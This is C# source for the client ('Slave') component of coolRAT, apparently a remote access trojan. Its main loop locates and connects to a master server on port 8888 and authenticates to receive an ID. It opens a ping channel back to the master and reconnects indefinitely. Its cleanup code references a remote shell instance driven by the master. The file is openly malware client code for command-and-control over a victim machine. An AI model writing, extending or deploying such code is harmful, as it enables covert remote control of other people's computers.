using coolRAT.Libs;
using coolRAT.Libs.PacketHandlers;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace coolRAT.Slave
{
    class Program
    {
        static void Main(string[] args)
        {
            MasterFinder.RunInit(new ConnectionSettings(8888));
            Console.WriteLine("-- Master Finder running");
            while (true)
            {
                SlaveGlobalData.PingService = new PingService(new Dictionary<Guid, Client>());
                MasterServerInfo inf = MasterFinder.ConnectToMasterServer();
                if (inf.HasValues)
                {
                    SlaveGlobalData.MasterServerInfo = inf;
                    SlaveGlobalData.LocalClient = inf.LocalClient;
                    SlaveGlobalData.MainListenerLoop = new PacketListenerLoop(inf.MainConnection, new Slave_PacketHandler(inf.MainConnection));
                    Console.WriteLine("Authentication complete.");
                    Console.WriteLine($"Assigned Id: {inf.LocalClient.UniqueId}");
                    Task.Run(() => SlaveGlobalData.MainListenerLoop.Run());
                    Console.WriteLine($"PacketHandler of type {SlaveGlobalData.MainListenerLoop.Handler.GetType().ToString()} has been assigned to the main connection");
                    Console.WriteLine($"Connecting to the master's PingService instance...");
                    Thread.Sleep(1000);
                    // Connect pipe
                    TcpConnection conn_ping = new TcpConnection();
                    if(conn_ping.Connect(inf.RemoteServer.Address.ToString(), inf.RemoteServer.Port))
                    {
                        ConnectPipePacket connectPipePacket = new ConnectPipePacket(SlaveGlobalData.LocalClient.UniqueId, PipeType.Ping);
                        conn_ping.SendPacket(connectPipePacket);
                        SlaveGlobalData.LocalClient.Pipes.PingPipe = conn_ping;
                        ClientInfo clientInfo = new ClientInfo(SlaveGlobalData.LocalClient.UniqueId, SlaveGlobalData.LocalClient, null);
                        clientInfo.ListenerLoop = new PacketListenerLoop(SlaveGlobalData.LocalClient.Pipes.PingPipe,
                            new Ping_PacketHandler(SlaveGlobalData.LocalClient.Pipes.PingPipe, clientInfo));
                        SlaveGlobalData.PingService.ConnectedClients.Add(clientInfo.ClientUniqueId, clientInfo);
                        Task.Run(() => clientInfo.ListenerLoop.Run());
                        Task.Run(() =>
                        {
                            Packet packet = new Packet(); // Send a dummy packet
                            clientInfo.Client.Pipes.PingPipe.SendPacket(packet);
                            Thread.Sleep(500);
                            PingPacket pingPacket = new PingPacket(Guid.NewGuid());
                            clientInfo.Client.Pipes.PingPipe.SendPacket(pingPacket);
                        });
                        Console.WriteLine("Connected to the master server!");
                        clientInfo.WaitForTimeout();
                        Console.WriteLine("Lost connection with the main server");
                        continue;
                    }

                    Console.WriteLine("Failed to connect to the master server!");
                    SlaveGlobalData.MasterServerInfo = new MasterServerInfo();
                    if(SlaveGlobalData.MainListenerLoop != null)
                    {
                        SlaveGlobalData.MainListenerLoop.AbortLoop = true;
                        SlaveGlobalData.MainListenerLoop = null;
                    }
                    if(SlaveGlobalData.PingService != null)
                    {
                        SlaveGlobalData.PingService.AbortLoop = true;
                        SlaveGlobalData.PingService.RemoveClient(SlaveGlobalData.LocalClient.UniqueId);
                    }
                    SlaveGlobalData.PingService = null;
                    SlaveGlobalData.LocalClient = null;
                    if (SlaveGlobalData.ShellListenerLoop != null)
                    {
                        SlaveGlobalData.ShellListenerLoop.AbortLoop = true;
                        SlaveGlobalData.ShellListenerLoop = null;
                    }
                    if(SlaveGlobalData.ShellInstance != null)
                    {
                        SlaveGlobalData.ShellInstance.Stop();
                        SlaveGlobalData.ShellInstance = null;
                        SlaveGlobalData.ShellOutputChangedHandler = null;
                    }
                    
                    Thread.Sleep(1000);
                }
            }
        }
    }
}
